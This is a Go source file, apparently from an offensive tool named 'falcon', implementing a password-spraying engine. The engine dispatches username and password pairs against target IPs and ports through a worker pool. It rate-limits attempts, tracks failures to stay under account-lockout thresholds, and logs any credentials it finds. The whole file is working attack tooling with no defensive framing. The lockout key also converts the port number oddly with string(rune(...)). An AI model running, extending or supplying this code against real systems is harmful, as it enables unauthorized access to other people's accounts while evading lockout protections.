package attack

import (
	"falcon/config"
	"falcon/logger"
	"sync"
	"time"
)

// NewAttackEngine creates a new attack engine
func NewAttackEngine(cfg *config.Config, targets []*config.Target, credentials []*config.Credential) *AttackEngine {
	return &AttackEngine{
		Config:      cfg,
		Targets:     targets,
		Credentials: credentials,
		Results:     make([]*config.Result, 0),
		Stopped:     make(chan bool),
		Mode:        PasswordSpraying,
		RateLimiter: NewRateLimiter(cfg.Attack.PPS),
		LockoutManager: NewLockoutManager(3, 60*time.Second),
	}
}

// Start begins the attack
func (ae *AttackEngine) Start() error {
	ae.Running = true
	ae.WorkerPool = NewWorkerPool(ae.Config.Attack.Threads)
	ae.WorkerPool.Start()

	go ae.distributeJobs()
	go ae.collectResults()

	logger.Info("Attack started with %d threads", ae.Config.Attack.Threads)
	return nil
}

// Stop stops the attack
func (ae *AttackEngine) Stop() {
	ae.Running = false
	ae.WorkerPool.Stop()
	logger.Info("Attack stopped")
}

// distributeJobs sends jobs to workers
func (ae *AttackEngine) distributeJobs() {
	for _, target := range ae.Targets {
		for _, cred := range ae.Credentials {
			if !ae.Running {
				break
			}

			// Check lockout
			key := target.IP + ":" + string(rune(target.Port)) + ":" + cred.Username
			if ae.LockoutManager.IsLockedOut(key) {
				continue
			}

			// Apply rate limiting
			ae.RateLimiter.Wait()

			job := &Job{
				Target:     target,
				Credential: cred,
				Mode:       ae.Mode,
			}

			ae.WorkerPool.Jobs <- job
		}
	}

	close(ae.WorkerPool.Jobs)
}

// collectResults collects results from workers
func (ae *AttackEngine) collectResults() {
	for result := range ae.WorkerPool.Results {
		ae.ResultsMutex.Lock()
		ae.Results = append(ae.Results, result)
		ae.ResultsMutex.Unlock()

		if result.Success {
			logger.Success("Found credentials: %s:%s on %s:%d", result.Username, result.Password, result.IP, result.Port)
		} else {
			logger.Error("Failed attempt on %s:%d - %s", result.IP, result.Port, result.Error)
		}

		// Update lockout manager
		if !result.Success {
			key := result.IP + ":" + string(rune(result.Port)) + ":" + result.Username
			ae.LockoutManager.RecordFailure(key)
		}
	}
}

// GetResults returns all results
func (ae *AttackEngine) GetResults() []*config.Result {
	ae.ResultsMutex.RLock()
	defer ae.ResultsMutex.RUnlock()
	return ae.Results
}

// GetSuccessfulResults returns only successful results
func (ae *AttackEngine) GetSuccessfulResults() []*config.Result {
	ae.ResultsMutex.RLock()
	defer ae.ResultsMutex.RUnlock()

	successful := make([]*config.Result, 0)
	for _, result := range ae.Results {
		if result.Success {
			successful = append(successful, result)
		}
	}
	return successful
}
